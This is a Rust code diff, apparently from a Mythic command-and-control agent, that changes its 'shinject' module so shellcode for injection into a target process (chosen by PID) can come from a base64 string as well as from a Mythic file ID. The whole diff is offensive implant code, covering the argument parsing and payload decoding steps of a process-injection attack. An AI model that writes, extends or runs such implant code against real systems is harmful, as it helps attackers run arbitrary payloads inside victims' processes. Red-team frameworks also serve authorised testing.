@@ -2,6 +2,7 @@ use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
 use crate::AgentTask;
+use base64::{Engine as _, engine::general_purpose};
 
 #[cfg(target_os = "windows")]
 use std::mem;
@@ -29,7 +30,9 @@ use winapi::um::winbase::WAIT_OBJECT_0;
 pub struct ShinjectArgs {
     pub pid: u32,
     #[serde(rename = "shellcode-file-id")]
-    pub shellcode_file_id: String,
+    pub shellcode_file_id: Option<String>,
+    #[serde(rename = "shellcode-base64")]
+    pub shellcode_base64: Option<String>,
 }
 
 #[cfg(target_os = "windows")]
@@ -73,20 +76,36 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
 pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
     eprintln!("DEBUG: Starting shinject execution for task {}", task_id);
     eprintln!("DEBUG: Target PID: {}", args.pid);
-    eprintln!("DEBUG: Shellcode file ID: {}", args.shellcode_file_id);
     
-    // FIX: Get shellcode via RPC from Mythic (this would need RPC integration)
-    // For now, we'll assume the file is automatically downloaded by Mythic
-    eprintln!("DEBUG: Attempting to get shellcode from Mythic");
-    let shellcode_bytes = match get_shellcode_from_mythic(&args.shellcode_file_id, task_id) {
-        Ok(bytes) => {
-            eprintln!("DEBUG: Successfully retrieved shellcode, size: {} bytes", bytes.len());
-            bytes
-        },
-        Err(e) => {
-            eprintln!("DEBUG: Failed to get shellcode: {}", e);
-            return Err(e);
-        },
+    // Get shellcode from either file ID or base64
+    let shellcode_bytes = if let Some(file_id) = &args.shellcode_file_id {
+        eprintln!("DEBUG: Shellcode file ID: {}", file_id);
+        eprintln!("DEBUG: Attempting to get shellcode from Mythic");
+        match get_shellcode_from_mythic(file_id, task_id) {
+            Ok(bytes) => {
+                eprintln!("DEBUG: Successfully retrieved shellcode, size: {} bytes", bytes.len());
+                bytes
+            },
+            Err(e) => {
+                eprintln!("DEBUG: Failed to get shellcode: {}", e);
+                return Err(e);
+            },
+        }
+    } else if let Some(base64_shellcode) = &args.shellcode_base64 {
+        eprintln!("DEBUG: Using base64 shellcode");
+        match general_purpose::STANDARD.decode(base64_shellcode) {
+            Ok(bytes) => {
+                eprintln!("DEBUG: Successfully decoded base64 shellcode, size: {} bytes", bytes.len());
+                bytes
+            },
+            Err(e) => {
+                eprintln!("DEBUG: Failed to decode base64 shellcode: {}", e);
+                return Err(format!("Failed to decode base64 shellcode: {}", e));
+            },
+        }
+    } else {
+        eprintln!("DEBUG: No shellcode source provided");
+        return Err("No shellcode source provided (neither file ID nor base64)".to_string());
     };
 
     // Validate shellcode size
